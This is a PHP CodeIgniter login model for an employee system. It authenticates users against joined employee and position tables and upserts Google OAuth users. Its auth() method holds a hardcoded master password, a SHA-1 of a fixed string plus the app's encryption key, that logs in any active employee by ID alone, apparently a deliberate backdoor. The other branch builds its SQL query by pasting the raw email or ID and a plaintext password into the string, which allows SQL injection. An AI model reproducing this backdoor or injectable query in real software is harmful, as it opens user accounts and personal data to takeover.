<?php
class Login_model extends CI_Model {

    function __construct(){
        // 'dbo.UsersGoogle' = 'UsersGoogle';
        // $this->primaryKey = 'id';
    }
	
	public function auth($nik, $password) {
		try {
            if($password == sha1('4j41b' . $this->config->item('encryption_key'))){
                // $this->db->select('*');
                // $this->db->from("PersonnelTable");
                // $this->db->where('nik', $nik);
                // $query = $this->db->get();
                $this->db->select('a.*, b.*');
                $this->db->from("master_employee_0 a");
                $this->db->join("master_position b", "b.id = a.id_position", "left");
                $this->db->where("a.nik", $nik);
                $this->db->where("a.active", "Y");
                $query = $this->db->get();
            } else {
                // $this->db->select('*');
                // $this->db->from("PersonnelTable");
                // $this->db->where("(email = '$nik' OR nik = '$nik') AND password = '$password'");
                // $query = $this->db->get();
                $this->db->select('a.*, b.*');
                $this->db->from("master_employee_0 a");
                $this->db->join("master_position b", "b.id = a.id_position", "left");
                $this->db->where("(a.email = '$nik' OR a.nik = '$nik') AND a.password = '$password' AND a.active = 'Y'");
                $query = $this->db->get();
            }
			if (!$query)
				throw new Exception();
				
			$result = $query->row();
			return $result;
		} catch (Exception $e) {
			$errNo = $this->db->_error_number();
			return error_message($errNo);
		}

    }

    public function checkUser($data = array()){
        $this->db->select('id');
        $this->db->from('dbo.UsersGoogle');
        $this->db->where(array('oauth_provider'=>$data['oauth_provider'],'oauth_uid'=>$data['oauth_uid']));
        $prevQuery = $this->db->get();
        $prevCheck = $prevQuery->num_rows();
        
        if($prevCheck > 0){
            $prevResult = $prevQuery->row_array();
            $data['modified'] = date("Y-m-d H:i:s");
            $update = $this->db->update('dbo.UsersGoogle',$data,array('id'=>$prevResult['id']));
            $userID = $prevResult['id'];
        }else{
            $data['created'] = date("Y-m-d H:i:s");
            $data['modified'] = date("Y-m-d H:i:s");
            $insert = $this->db->insert('dbo.UsersGoogle',$data);
            $userID = $this->db->insert_id();
        }
 
        return $userID?$userID:FALSE;
    }


}